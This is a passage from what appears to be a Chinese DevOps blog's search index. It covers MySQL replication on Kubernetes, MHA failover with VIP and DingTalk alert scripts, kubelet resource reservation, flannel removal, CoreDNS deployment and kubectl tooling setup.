server-id，并将配置内容写入到/mnt/conf.d/server-id.conf，同时将mysql主配置文件复制到/mnt/conf.d/目录下 此时conf这个卷包含了mysql主的配置文件和server-id配置文件 2.clone-mysql容器 这个容器是为从节点准备的,从节点在第一次启动时需要从主节点或前一个从节点进行全量数据同步 同样这里也使用了数据卷mysql-data，挂载到了/var/lib/mysql，同步的数据会存放在/var/lib/mysql中,提供给mysql主容器使用 mysql-data是通过pvc模版配置，这个卷的内容在每个pod中是不一样的。这需要你的k8s集群中支持storage-class 4.2 常驻容器 下面介绍的是pod中的两个常驻容器，一个是mysql用于提供mysql服务。另一个是xtrabackup用于提供在其他节点首次启动时同步数据的功能和执行change master to sql将当前节点配置为从节点 1.mysql容器 这个容器挂载了两个数据卷，一个是conf用于存放mysql配置文件的，挂载到了/etc/mysql/conf.d中 另一个是mysql-data用于存放mysql数据文件，这个卷挂载到了/var/lib/mysql下，这个目录的数据由clone-mysql容器提供 2.xtrabackup容器 这个容器挂载了mysql-data数据卷，用于判断当前pod中的mysql是否需要执行change to master sql 第二个功能是使用ncat开启一个常驻进程，提供tcp传输mysql备份数据的能力 ","date":"2021-07-19 14:21","objectID":"/post/2577/:0:5","tags":["mysql","k8s"],"title":"k8s 使用statefulset部署mysql主从","uri":"/post/2577/"},{"categories":["kubernetes"],"content":"5.测试 主节点造数据 k exec -it mysql-0 mysql mysql\u003e create database soulchild; mysql\u003e use soulchild mysql\u003e create table my_test(id int); mysql\u003e insert into my_test values(1); 从节点查数据 k exec -it mysql-1 -- mysql -e 'show databases;' +------------------------+ | Database | +------------------------+ | information_schema | | mysql | | performance_schema | | soulchild | | sys | | xtrabackup_backupfiles | +------------------------+ k exec -it mysql-1 -- mysql -e 'use soulchild;show tables;' +---------------------+ | Tables_in_soulchild | +---------------------+ | my_test | +---------------------+ k exec -it mysql-1 -- mysql -e 'use soulchild;select id from my_test;' +------+ | id | +------+ | 1 | +------+ ","date":"2021-07-19 14:21","objectID":"/post/2577/:0:6","tags":["mysql","k8s"],"title":"k8s 使用statefulset部署mysql主从","uri":"/post/2577/"},{"categories":["系统服务"],"content":"一、机器规划 |主机|IP|角色 |- |mysql01|172.17.20.240|master |mysql02|172.17.20.241|slave |mysql03|172.17.20.242|slave |manage|172.17.20.150|manage |vip|172.17.20.243|vip| ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:1","tags":["mysql","mha"],"title":"mysql MHA部署配置","uri":"/post/2568/"},{"categories":["系统服务"],"content":"二、安装mysql 可参考https://soulchild.cn/266.html ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:2","tags":["mysql","mha"],"title":"mysql MHA部署配置","uri":"/post/2568/"},{"categories":["系统服务"],"content":"三、mysql配置文件 mysql01 [mysqld] basedir=/usr/local/mysql datadir=/data/mysql socket=/tmp/mysql.sock server_id=100 read-only=1 port=3306 log-bin=mysql-bin relay-log = mysql-relay-bin replicate-wild-ignore-table=mysql.% replicate-wild-ignore-table=test.% replicate-wild-ignore-table=information_schema.% [mysqld_safe] log-error=/var/log/mysql.log mysql02 [mysqld] basedir=/usr/local/mysql datadir=/data/mysql socket=/tmp/mysql.sock server_id=101 read-only=1 port=3306 log-bin=mysql-bin relay-log = mysql-relay-bin replicate-wild-ignore-table=mysql.% replicate-wild-ignore-table=test.% replicate-wild-ignore-table=information_schema.% [mysqld_safe] log-error=/var/log/mysql.log mysql03 [mysqld] basedir=/usr/local/mysql datadir=/data/mysql socket=/tmp/mysql.sock server_id=102 read-only=1 port=3306 log-bin=mysql-bin relay-log = mysql-relay-bin replicate-wild-ignore-table=mysql.% replicate-wild-ignore-table=test.% replicate-wild-ignore-table=information_schema.% [mysqld_safe] log-error=/var/log/mysql.log ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:3","tags":["mysql","mha"],"title":"mysql MHA部署配置","uri":"/post/2568/"},{"categories":["系统服务"],"content":"四、创建mysql账号 所有节点执行 # 主从复制账号 grant replication slave on *.* to 'repl_user'@'172.17.%.%' identified by 'soulchild_repl'; # 管理员账号 grant all on *.* to 'root'@'172.17.%.%' identified by 'soulchild'; ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:4","tags":["mysql","mha"],"title":"mysql MHA部署配置","uri":"/post/2568/"},{"categories":["系统服务"],"content":"五、开启主从同步 1.查看master bin-log位置 20774-pif4cv8u1ul.png 2.修改slave为从节点 # mysql02 mysql\u003e change master to master_host='172.17.20.240',master_user='repl_user',master_password='soulchild_repl',master_log_file='mysql-bin.000002',master_log_pos=740; mysql\u003e start slave; # mysql03 mysql\u003e change master to master_host='172.17.20.240',master_user='repl_user',master_password='soulchild_repl',master_log_file='mysql-bin.000002',master_log_pos=740; mysql\u003e start slave; ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:5","tags":["mysql","mha"],"title":"mysql MHA部署配置","uri":"/post/2568/"},{"categories":["系统服务"],"content":"六、下载安装MHA工具 下载地址: https://github.com/yoshinorim/mha4mysql-manager/releases https://github.com/yoshinorim/mha4mysql-node/releases https://code.google.com/archive/p/mysql-master-ha/downloads # 所有mysql节点安装node包 yum install -y mha4mysql-node-0.58-0.el7.centos.noarch.rpm # manager节点 yum install -y mha4mysql-node-0.58-0.el7.centos.noarch.rpm mha4mysql-manager-0.58-0.el7.centos.noarch.rpm ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:6","tags":["mysql","mha"],"title":"mysql MHA部署配置","uri":"/post/2568/"},{"categories":["系统服务"],"content":"七、配置所有节点SSH免密登录 略 ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:7","tags":["mysql","mha"],"title":"mysql MHA部署配置","uri":"/post/2568/"},{"categories":["系统服务"],"content":"八、配置mha-manager 以下操作在manager节点执行 1.创建相关文件目录 mkdir /etc/mha/ touch /etc/mha/app1.conf 2.编写配置文件 vim /etc/mha/app1.conf [server default] # mysql管理员用户名密码 user=root password=soulchild # ssh的用户 ssh_user=root # 主从复制的用户名密码 repl_user=repl_user repl_password=soulchild_repl # mysql二进制日志路径,也可以单独写在单独server部分中 master_binlog_dir=/data/mysql/ # 执行pingSQL语句的频率 ping_interval=1 # mha-manager的日志路径 manager_log=/var/log/mha/app1/manager.log manager_workdir=/var/log/mha/app1 [server1] # mysql主机ip hostname=172.17.20.240 port=3306 # 优先将此服务器设置为主 candidate_master=1 # 默认情况下，如果slave落后于master超过100MB的中继日志,MHA不会选择这台从作为新的master,设置check_repl_delay=0会忽略这个机制 check_repl_delay=0 [server2] hostname=172.17.20.241 port=3306 master_binlog_dir=/data/mysql [server3] hostname=172.17.20.242 port=3306 candidate_master=1 ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:8","tags":["mysql","mha"],"title":"mysql MHA部署配置","uri":"/post/2568/"},{"categories":["系统服务"],"content":"九、检查配置 1.检查ssh免密配置,在manager节点 masterha_check_ssh --conf=/etc/mha/app1.conf 11186-2wqivpvc0p7.png 2.检查主从状态 masterha_check_repl --conf=/etc/mha/app1.conf 42710-33fqfj426tq.png 这里报错找不到mysqlbinlog，解决方法如下,再次执行检查，看到MySQL Replication Health is OK.就代表没问题了 ln -s /usr/local/mysql/bin/mysqlbinlog /usr/bin/ ln -s /usr/local/mysql/bin/mysql /usr/bin/ ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:9","tags":["mysql","mha"],"title":"mysql MHA部署配置","uri":"/post/2568/"},{"categories":["系统服务"],"content":"十、启动mha-manager nohup masterha_manager --conf=/etc/mha/app1.conf --ignore_last_failover \u0026\u003e /var/log/mha/app1/app1_start.log \u0026 默认情况下两次宕机时间不足8小时(–last_failover_minute=480)，是不会执行failover的，使用–ignore_last_failover参数会忽略这个机制。 如果不设置–ignore_last_failover参数，则需要手动删除[manager_workdir]/xxx.failover.xxx文件 检查运行状态 masterha_check_status --conf /etc/mha/app1.conf 34753-r122eijri.png 停止mha: masterha_stop --conf /etc/mha/app1.conf ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:10","tags":["mysql","mha"],"title":"mysql MHA部署配置","uri":"/post/2568/"},{"categories":["系统服务"],"content":"十一、故障模拟 1.停止master systemctl stop mysqld 2.查看当前master是否切换 39079-lzrgecfm5o.png 3.将旧master作为slave加入到集群 # 查看manager日志,可以看到如下内容,将xxx改为repl_user的密码，在旧master节点上执行 CHANGE MASTER TO MASTER_HOST='172.17.20.242', MASTER_PORT=3306, MASTER_LOG_FILE='mysql-bin.000001', MASTER_LOG_POS=740, MASTER_USER='repl_user', MASTER_PASSWORD='xxx'; # 启动slave start slave; 4.再次启动mha-manager nohup masterha_manager --conf=/etc/mha/app1.conf --ignore_last_failover \u0026\u003e /var/log/mha/app1/app1_start.log \u0026 ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:11","tags":["mysql","mha"],"title":"mysql MHA部署配置","uri":"/post/2568/"},{"categories":["系统服务"],"content":"十二、配置vip漂移脚本 1.创建目录 mkdir /etc/mha/scripts/ 2.编写脚本 vim /etc/mha/scripts/master_ip_failover 需要修改$vip,$key,$ssh_start_vip, $ssh_stop_vip #!/usr/bin/env perl use strict; use warnings FATAL =\u003e 'all'; use Getopt::Long; use MHA::DBHelper; my ( $command, $ssh_user, $orig_master_host, $orig_master_ip, $orig_master_port, $new_master_host, $new_master_ip, $new_master_port, $new_master_user, $new_master_password ); my $vip = '172.17.20.243/24'; my $key = \"1\"; my $ssh_start_vip = \"/sbin/ifconfig eth0:$key $vip\"; my $ssh_stop_vip = \"/sbin/ifconfig eth0:$key down\"; GetOptions( 'command=s' =\u003e \\$command, 'ssh_user=s' =\u003e \\$ssh_user, 'orig_master_host=s' =\u003e \\$orig_master_host, 'orig_master_ip=s' =\u003e \\$orig_master_ip, 'orig_master_port=i' =\u003e \\$orig_master_port, 'new_master_host=s' =\u003e \\$new_master_host, 'new_master_ip=s' =\u003e \\$new_master_ip, 'new_master_port=i' =\u003e \\$new_master_port, 'new_master_user=s' =\u003e \\$new_master_user, 'new_master_password=s' =\u003e \\$new_master_password, ); exit \u0026main(); sub main { if ( $command eq \"stop\" || $command eq \"stopssh\" ) { # $orig_master_host, $orig_master_ip, $orig_master_port are passed. # If you manage master ip address at global catalog database, # invalidate orig_master_ip here. my $exit_code = 1; eval { # updating global catalog, etc $exit_code = 0; }; if ($@) { warn \"Got Error: $@\\n\"; exit $exit_code; } exit $exit_code; } elsif ( $command eq \"start\" ) { # all arguments are passed. # If you manage master ip address at global catalog database, # activate new_master_ip here. # You can also grant write access (create user, set read_only=0, etc) here. my $exit_code = 10; eval { print \"Enabling the VIP - $vip on the new master - $new_master_host \\n\"; \u0026start_vip(); \u0026stop_vip(); $exit_code = 0; }; if ($@) { warn $@; exit $exit_code; } exit $exit_code; } elsif ( $command eq \"status\" ) { print \"Checking the Status of the script.. OK \\n\"; `ssh $ssh_user\\@$orig_master_host \\\" $ssh_start_vip \\\"`; exit 0; } else { \u0026usage(); exit 1; } } sub start_vip() { `ssh $ssh_user\\@$new_master_host \\\" $ssh_start_vip \\\"`; } # A simple system call that disable the VIP on the old_master sub stop_vip() { `ssh $ssh_user\\@$orig_master_host \\\" $ssh_stop_vip \\\"`; } sub usage { print \"Usage: master_ip_failover --command=start|stop|stopssh|status --orig_master_host=host --orig_master_ip=ip --orig_master_port=port --new_master_host=host --new_master_ip=ip --new_master_port=port\\n\"; } 3.给脚本添加执行权限 chmod +x /etc/mha/scripts/master_ip_failover 4.修改配置文件,在[server default]部分添加脚本参数 vim /etc/mha/app1.conf [server default] # mysql管理员用户名密码 user=root password=soulchild # ssh的用户 ssh_user=root # 主从复制的用户名密码 repl_user=repl_user repl_password=soulchild_repl # mysql二进制日志路径,也可以单独写在单独server部分中 master_binlog_dir=/data/mysql/ # 执行pingSQL语句的频率 ping_interval=1 # mha-manager的日志路径 manager_log=/var/log/mha/app1/manager.log manager_workdir=/var/log/mha/app1 # vip漂移脚本 master_ip_failover_script=/etc/mha/scripts/master_ip_failover [server1] # mysql主机ip hostname=172.17.20.240 port=3306 # 优先将此服务器设置为主 candidate_master=1 # 默认情况下，如果slave落后于master超过100MB的中继日志,MHA不会选择这台从作为新的master,设置check_repl_delay=0会忽略这个机制 check_repl_delay=0 [server2] hostname=172.17.20.241 port=3306 master_binlog_dir=/data/mysql [server3] hostname=172.17.20.242 port=3306 candidate_master=1 5.第一次手动配置vip # 在当前master节点中添加 ifconfig eth0:1 172.17.20.243/24 6.重新启动mha-manager masterha_stop --conf=/etc/mha/app1.conf nohup masterha_manager --conf=/etc/mha/app1.conf --ignore_last_failover \u0026\u003e /var/log/mha/app1/app1_start.log \u0026 7.测试 略，重复上面的故障测试步骤，检查vip是否已漂移 ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:12","tags":["mysql","mha"],"title":"mysql MHA部署配置","uri":"/post/2568/"},{"categories":["系统服务"],"content":"十三、故障转移告警通知 1.修改配置文件,在[server default]部分添加参数 report_script=/etc/mha/scripts/send_dingtalk 2.编写脚本 vim /etc/mha/scripts/send_dingtalk #!/usr/bin/python3 # -*- coding: utf-8 -*- import requests import json import sys import os headers = {'Content-Type': 'application/json;charset=utf-8'} api_url = \"https://oapi.dingtalk.com/robot/send?access_token=xxx\" def msg(subject, content): json_text = { \"msgtype\": \"text\", \"text\": { \"content\": subject + '\\n' + content }, } print(requests.post(api_url, json.dumps(json_text), headers=headers).content) if __name__ == '__main__': orig_master_host = sys.argv[1] new_master_host = sys.argv[2] new_slave_hosts = sys.argv[3] subject = sys.argv[4] body = sys.argv[5] msg(\"MHA切换告警\\n\", \"旧master: \" + orig_master_host + \"\\n\" + \"新master: \" + new_master_host + \"\\n\" + \"新slave: \" + new_slave_hosts + \"\\n\" + \"subject: \" + subject + \"\\n\" + \"body:\" + body) 3.重启mha-manager masterha_stop --conf=/etc/mha/app1.conf nohup masterha_manager --conf=/etc/mha/app1.conf --ignore_last_failover \u0026\u003e /var/log/mha/app1/app1_start.log \u0026 4.测试 请查看十一、故障模拟 64189-quqryhyfu4i.png ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:13","tags":["mysql","mha"],"title":"mysql MHA部署配置","uri":"/post/2568/"},{"categories":["kubernetes"],"content":"1.查找pod所属的node节点和容器ID kubectl get pod POD_NAME -o yaml | egrep 'containerID|nodeName' 2.查看容器网卡的链接索引值： kubectl exec -it POD_NAME -- 'cat /sys/class/net/eth0/iflink' # 如果容器没有命令可以使用其他镜像进行查看 docker run -it --rm --network container:bba31a6eabfd busybox:1.23 'cat /sys/class/net/eth0/iflink' 34826-mngkhxwzq6m.png 链接到索引是42的网卡上 3.根据索引值找到宿主机网卡 ip link |grep ^42 76251-iyk6ufvobqo.png 4.抓包 tcpdump -i vetha6b03cb1 port 80 -nn 68833-kcxiuiu3xym.png ","date":"2021-07-02 15:20","objectID":"/post/2556/:0:0","tags":["k8s"],"title":"k8s 对pod抓包","uri":"/post/2556/"},{"categories":["kubernetes"],"content":"bash \u0026 zsh一键安装 ( set -x; cd \"$(mktemp -d)\" \u0026\u0026 OS=\"$(uname | tr '[:upper:]' '[:lower:]')\" \u0026\u0026 ARCH=\"$(uname -m | sed -e 's/x86_64/amd64/' -e 's/\\(arm\\)\\(64\\)\\?.*/\\1\\2/' -e 's/aarch64$/arm64/')\" \u0026\u0026 curl -fsSLO \"https://github.com/kubernetes-sigs/krew/releases/latest/download/krew.tar.gz\" \u0026\u0026 tar zxvf krew.tar.gz \u0026\u0026 KREW=./krew-\"${OS}_${ARCH}\" \u0026\u0026 \"$KREW\" install krew ) # 配置环境变量 echo 'export PATH=$PATH:$HOME/.krew/bin' \u003e\u003e ~/.bashrc linux-x86_64 手动安装 wget https://github.com/kubernetes-sigs/krew/releases/latest/download/krew.tar.gz tar zxvf krew.tar.gz ./krew-linux_amd64 ./krew-linux_amd64 install krew # 配置环境变量 echo 'export PATH=$PATH:$HOME/.krew/bin' \u003e\u003e ~/.bashrc ","date":"2021-07-02 15:07","objectID":"/post/2553/:0:0","tags":["k8s"],"title":"kubectl插件管理工具 krew安装","uri":"/post/2553/"},{"categories":["kubernetes"],"content":"bash配置 1.下载安装 wget https://github.com//dty1er/kubecolor/releases/download/v0.0.20/kubecolor_0.0.20_Linux_x86_64.tar.gz tar xf kubecolor_0.0.20_Linux_x86_64.tar.gz -C /usr/local/bin/ kubecolor 2.修改kubecolor别名为k echo 'source\u003c(kubectl completion bash)' \u003e\u003e ~/.bashrc echo 'command -v kubecolor \u003e/dev/null 2\u003e\u00261 \u0026\u0026 alias k=\"kubecolor\"' \u003e\u003e ~/.bashrc echo 'complete -o default -F __start_kubectl k' \u003e\u003e ~/.bashrc 4.使配置生效 source ~/.bashrc ","date":"2021-07-01 11:13","objectID":"/post/2550/:0:1","tags":["k8s"],"title":"k8s 配置kubecolor高亮显示","uri":"/post/2550/"},{"categories":["kubernetes"],"content":"zsh配置 wget https://github.com//dty1er/kubecolor/releases/download/v0.0.20/kubecolor_0.0.20_Linux_x86_64.tar.gz tar xf kubecolor_0.0.20_Linux_x86_64.tar.gz -C /usr/local/bin/ kubecolor cat \u003e\u003e ~/.zshrc \u003c\u003cEOF source \u003c(kubectl completion zsh) complete -o default -F __start_kubectl kubecolor command -v kubecolor \u003e/dev/null 2\u003e\u00261 \u0026\u0026 alias k=\"kubecolor\" EOF ","date":"2021-07-01 11:13","objectID":"/post/2550/:0:2","tags":["k8s"],"title":"k8s 配置kubecolor高亮显示","uri":"/post/2550/"},{"categories":["kubernetes"],"content":"原文链接: 从一次集群雪崩看Kubelet资源预留的正确姿势 https://my.oschina.net/jxcdwangtao/blog/1629059 ","date":"2021-06-30 09:27","objectID":"/post/2539/:0:0","tags":["k8s"],"title":"k8s-node节点资源预留相关配置","uri":"/post/2539/"},{"categories":["kubernetes"],"content":"Kubelet Node Allocatable Kubelet Node Allocatable用来为Kube组件和System进程预留资源，从而保证当节点出现满负荷时也能保证Kube和System进程有足够的资源。 目前支持cpu, memory, ephemeral-storage三种资源预留。 node Capacity resources是Node的所有硬件资源，kube-reserved resources是给kube组件预留的资源，system-reserved resources是给系统进程预留的资源，hard eviction threshold resources是kubelet eviction的阈值设定，node allocatable resources才是真正scheduler调度Pod时的参考值（保证Node上所有Pods的request resource不超过Allocatable）。 (node可用资源计算) Node Allocatable Resource = Node Capacity - Kube-reserved - system-reserved - eviction-threshold 25347-qi0e9d2i65j.png ","date":"2021-06-30 09:27","objectID":"/post/2539/:0:1","tags":["k8s"],"title":"k8s-node节点资源预留相关配置","uri":"/post/2539/"},{"categories":["kubernetes"],"content":"如何配置 –enforce-node-allocatable，默认为pods，要为kube组件和System进程预留资源，则需要设置为pods,kube-reserved,system-reserve。 –cgroups-per-qos，Enabling QoS and Pod level cgroups，默认开启。开启后，kubelet会将管理所有workload Pods的cgroups。 –cgroup-driver，默认为cgroupfs，另一可选项为systemd。取决于容器运行时使用的cgroup driver，kubelet与其保持一致。比如你配置docker使用systemd cgroup driver，那么kubelet也需要配置–cgroup-driver=systemd。 –kube-reserved,用于配置为kube组件（kubelet,kube-proxy,dockerd等）预留的资源量，比如—kube-reserved=cpu=1000m,memory=8Gi，ephemeral-storage=16Gi。 –kube-reserved-cgroup，如果你设置了–kube-reserved，那么请一定要设置对应的cgroup，并且该cgroup目录要事先创建好，否则kubelet将不会自动创建导致kubelet启动失败。比如设置为kube-reserved-cgroup=/kubelet.service 。 –system-reserved，用于配置为System进程预留的资源量，比如—system-reserved=cpu=500m,memory=4Gi,ephemeral-storage=4Gi。 –system-reserved-cgroup，如果你设置了–system-reserved，那么请一定要设置对应的cgroup，并且该cgroup目录要事先创建好，否则kubelet将不会自动创建导致kubelet启动失败。比如设置为system-reserved-cgroup=/system.slice。 –eviction-hard，用来配置kubelet的hard eviction条件，只支持memory和ephemeral-storage两种不可压缩资源。当出现MemoryPressure时，Scheduler不会调度新的Best-Effort QoS Pods到此节点。当出现DiskPressure时，Scheduler不会调度任何新Pods到此节点。关于Kubelet Eviction的更多解读，请参考我的相关博文。 Kubelet Node Allocatable的代码很简单，主要在pkg/kubelet/cm/node_container_manager.go，感兴趣的同学自己去走读一遍。 关于如何规划Node的Cgroup结构，请参考官方建议: recommended-cgroups-setup ","date":"2021-06-30 09:27","objectID":"/post/2539/:0:2","tags":["k8s"],"title":"k8s-node节点资源预留相关配置","uri":"/post/2539/"},{"categories":["kubernetes"],"content":"简单示例 以如下的kubelet资源预留为例，Node Capacity为memory=32Gi, cpu=16, ephemeral-storage=100Gi，我们对kubelet进行如下配置： --enforce-node-allocatable=pods,kube-reserved,system-reserved --kube-reserved-cgroup=/kubelet.service --system-reserved-cgroup=/system.slice --kube-reserved=cpu=1,memory=2Gi,ephemeral-storage=1Gi --system-reserved=cpu=500m,memory=1Gi,ephemeral-storage=1Gi --eviction-hard=memory.available\u003c500Mi,nodefs.available\u003c10% 最终计算结果: NodeAllocatable = NodeCapacity - Kube-reserved - system-reserved - eviction-threshold = cpu=14.5,memory=28.5Gi,ephemeral-storage=98Gi. Scheduler会确保Node上所有的Pod Resource Request不超过NodeAllocatable。Pods所使用的memory和storage之和超过NodeAllocatable后就会触发kubelet Evict Pods。 ","date":"2021-06-30 09:27","objectID":"/post/2539/:0:3","tags":["k8s"],"title":"k8s-node节点资源预留相关配置","uri":"/post/2539/"},{"categories":["kubernetes"],"content":"我踩的坑 kube-reserved-cgroup及system-reserved-cgroup配置 最开始，我只对kubelet做了如下配置–kube-reserved, –system-reserved,我就以为kubelet会自动给kube和system创建对应的Cgroup，并设置对应的cpu share, memory limit等，然后高枕无忧了。 然而实际上并非如此，直到在线上有一次某个TensorFlow worker的问题，无限制的使用节点的cpu，导致节点上cpu usage持续100%运行，并且压榨到了kubelet组件的cpu使用，导致kubelet与APIServer的心跳断了，这个节点便Not Ready了。 接着，Kubernetes会在其他某个最优的Ready Node上启动这个贪婪的worker，进而把这个节点的cpu也跑满了，节点Not Ready了。 如此就出现了集群雪崩，集群内的Nodes逐个的Not Ready了,后果非常严重。 把kublet加上如下配置后，即可保证在Node高负荷时，也能保证当kubelet需要cpu时至少能有–kube-reserved设置的cpu cores可用。 --enforce-node-allocatable=pods,kube-reserved,system-reserved --kube-reserved-cgroup=/kubelet.service --system-reserved-cgroup=/system.slice 注意,因为kube-reserved设置的cpu其实最终是写到kube-reserved-cgroup下面的cpu shares。了解cpu shares的同学知道，只有当集群的cpu跑满需要抢占时才会起作用，因此你会看到Node的cpu usage还是有可能跑到100%的，但是不要紧，kubelet等组件并没有收到影响，如果kubelet此时需要更多的cpu，那么它就能抢到更多的时间片，最多可以抢到kube-reserved设置的cpu nums。 ","date":"2021-06-30 09:27","objectID":"/post/2539/:0:4","tags":["k8s"],"title":"k8s-node节点资源预留相关配置","uri":"/post/2539/"},{"categories":["kubernetes"],"content":"Kubernetes会检查的cgroup subsystem 在Kubernetes 1.7版本，Kubelet启动会检查以下cgroup subsystem的存在： 66962-3c5ft5jbar4.png 在Kubernetes 1.8及1.9版本，Kubelet启动会检查以下cgroup subsystem的存在： 06512-bmgk8tochvc.png 对于Centos系统，cpuset和hugetlb subsystem是默认没有初始化system.slice，因此需要手动创建，否则会报Failed to start ContainerManager Failed to enforce System Reserved Cgroup Limits on “/system.slice”: “/system.slice” cgroup does not exist的错误日志。 我们可以通过在kubelet service中配置ExecStartPre来实现。 79097-8gp5vn1w0z2.png ","date":"2021-06-30 09:27","objectID":"/post/2539/:0:5","tags":["k8s"],"title":"k8s-node节点资源预留相关配置","uri":"/post/2539/"},{"categories":["kubernetes"],"content":"1.删除flannel # k8s部署的 kubectl delete daemonset -n kube-system kube-flannel # 二进制部署的 systemctl stop flanneld rm -f /etc/systemd/system/flanneld.service rm -f /usr/local/bin/flanneld 2.删除flannel和cni网卡等配置 # cni ifconfig cni0 down ip link delete cni0 rm -rf /var/lib/cni/ rm -f /etc/cni/net.d/* # flannel ifconfig flannel.1 down ip link delete flannel.1 rm -fr /var/run/flannel/ rm -fr /etc/kube-flannel 3.手动清除路由 route del -net 10.244.x.x/24 gw xxx.xxx.xxx.xxx 4.重启kubelet systemctl restart kubelet ","date":"2021-06-29 17:06","objectID":"/post/2525/:0:0","tags":["k8s"],"title":"flannel完全卸载","uri":"/post/2525/"},{"categories":["kubernetes"],"content":"添加污点 kubectl taint node 172.17.20.201 node-role.kubernetes.io/master:NoSchedule kubectl taint node 172.17.20.202 node-role.kubernetes.io/master:NoSchedule kubectl taint node 172.17.20.203 node-role.kubernetes.io/master:NoSchedule 配置角色标签 kubectl label nodes 172.17.20.201 node-role.kubernetes.io/master= kubectl label nodes 172.17.20.201 node-role.kubernetes.io/control-plane= kubectl label nodes 172.17.20.202 node-role.kubernetes.io/master= kubectl label nodes 172.17.20.202 node-role.kubernetes.io/control-plane= kubectl label nodes 172.17.20.203 node-role.kubernetes.io/master= kubectl label nodes 172.17.20.203 node-role.kubernetes.io/control-plane= ","date":"2021-06-28 21:13","objectID":"/post/2536/:0:0","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-配置master污点和role lable(十四)","uri":"/post/2536/"},{"categories":["kubernetes"],"content":"一、下载yaml coredns使用k8s部署,官方提供的模板:https://github.com/coredns/deployment/blob/master/kubernetes/coredns.yaml.sed 下载后的yaml需要替换如下字段 # 这个对应kubelet的DNS CLUSTER_DNS_IP: 10.1.0.10 CLUSTER_DOMAIN: cluster.local REVERSE_CIDRS: in-addr.arpa ip6.arpa STUBDOMAINS: 无 UPSTREAMNAMESERVER: /etc/resolv.conf # 修改镜像为1.7.1 coredns/coredns:1.7.1 ","date":"2021-06-28 10:44","objectID":"/post/2523/:0:1","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-coredns安装(十三)","uri":"/post/2523/"},{"categories":["kubernetes"],"content":"二、部署 修改后的coredns.yaml apiVersion: v1 kind: ServiceAccount metadata: name: coredns namespace: kube-system --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: labels: kubernetes.io/bootstrapping: rbac-defaults name: system:coredns rules: - apiGroups: - \"\" resources: - endpoints - services - pods - namespaces verbs: - list - watch - apiGroups: - discovery.k8s.io resources: - endpointslices verbs: - list - watch --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: annotations: rbac.authorization.kubernetes.io/autoupdate: \"true\" labels: kubernetes.io/bootstrapping: rbac-defaults name: system:coredns roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: system:coredns subjects: - kind: ServiceAccount name: coredns namespace: kube-system --- apiVersion: v1 kind: ConfigMap metadata: name: coredns namespace: kube-system data: Corefile: | .:53 { errors health { lameduck 5s } ready kubernetes cluster.local in-addr.arpa ip6.arpa { fallthrough in-addr.arpa ip6.arpa } prometheus :9153 forward . /etc/resolv.conf { max_concurrent 1000 } cache 30 loop reload loadbalance } --- apiVersion: apps/v1 kind: Deployment metadata: name: coredns namespace: kube-system labels: k8s-app: kube-dns kubernetes.io/name: \"CoreDNS\" spec: # replicas: not specified here: # 1. Default is 1. # 2. Will be tuned in real time if DNS horizontal auto-scaling is turned on. strategy: type: RollingUpdate rollingUpdate: maxUnavailable: 1 selector: matchLabels: k8s-app: kube-dns template: metadata: labels: k8s-app: kube-dns spec: priorityClassName: system-cluster-critical serviceAccountName: coredns tolerations: - key: \"CriticalAddonsOnly\" operator: \"Exists\" nodeSelector: kubernetes.io/os: linux affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: k8s-app operator: In values: [\"kube-dns\"] topologyKey: kubernetes.io/hostname containers: - name: coredns image: coredns/coredns:1.7.1 imagePullPolicy: IfNotPresent resources: limits: memory: 170Mi requests: cpu: 100m memory: 70Mi args: [ \"-conf\", \"/etc/coredns/Corefile\" ] volumeMounts: - name: config-volume mountPath: /etc/coredns readOnly: true ports: - containerPort: 53 name: dns protocol: UDP - containerPort: 53 name: dns-tcp protocol: TCP - containerPort: 9153 name: metrics protocol: TCP securityContext: allowPrivilegeEscalation: false capabilities: add: - NET_BIND_SERVICE drop: - all readOnlyRootFilesystem: true livenessProbe: httpGet: path: /health port: 8080 scheme: HTTP initialDelaySeconds: 60 timeoutSeconds: 5 successThreshold: 1 failureThreshold: 5 readinessProbe: httpGet: path: /ready port: 8181 scheme: HTTP dnsPolicy: Default volumes: - name: config-volume configMap: name: coredns items: - key: Corefile path: Corefile --- apiVersion: v1 kind: Service metadata: name: kube-dns namespace: kube-system annotations: prometheus.io/port: \"9153\" prometheus.io/scrape: \"true\" labels: k8s-app: kube-dns kubernetes.io/cluster-service: \"true\" kubernetes.io/name: \"CoreDNS\" spec: selector: k8s-app: kube-dns clusterIP: 10.1.0.10 ports: - name: dns port: 53 protocol: UDP - name: dns-tcp port: 53 protocol: TCP - name: metrics port: 9153 protocol: TCP 部署 kubectl apply -f coredns.yaml ","date":"2021-06-28 10:44","objectID":"/post/2523/:0:2","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-coredns安装(十三)","uri":"/post/2523/"},{"categories":["kubernetes"],"content":"三、测试 # 运行一个pod，测试通过service访问我们之前创建的my-pod1 kubectl run svc-test --image=busybox -it --rm --command -- sh wget -O - -o /dev/null my-pod1 95421-1tuh8msyjrg.png ","date":"2021-06-28 10:44","objectID":"/post/2523/:0:3","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-coredns安装(十三)","uri":"/post/2523/"},{"categories":["kubernetes"],"content":"一、安装kubelet # 安装kubelet for i in {201..203};do scp /server/packages/kubernetes/server/bin/kube-proxy root@172.17.20.$i:/usr/local/bin/ ;done for i in {210..212};do scp /server/packages/kubernetes/server/bin/kube-proxy root@172.17.20.$i:/usr/local/bin/ ;done ","date":"2021-06-23 16:29","objectID":"/post/2505/:0:1","tags":["k8s"],"title":"kubernetes 1.20.7 